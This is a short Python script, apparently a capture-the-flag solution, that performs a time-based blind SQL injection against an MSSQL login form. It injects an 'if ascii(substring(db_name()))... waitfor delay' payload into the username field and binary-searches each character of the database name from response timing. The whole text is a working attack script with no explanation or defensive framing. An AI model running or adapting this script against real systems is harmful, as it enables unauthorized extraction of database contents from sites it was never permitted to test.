import requests
import time
 
url = 'URL网址'
flag = ''
 
for i in range(1,1000):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = f"admin');if(ascii(substring(db_name(),{i},1))) > {mid} waitfor delay '0:0:3'-- "
        data = {
            "username":payload,
            "password":'1'
        }      
        last = int(time.time())
        response = requests.post(url, data = data)
        now = int(time.time())
        if now - last > 1 :    
            low = mid + 1
        else :
            high = mid
        mid = (low + high) // 2 
    if low != 32 :
        flag += chr(int(low))
    else:
        break
    print(flag)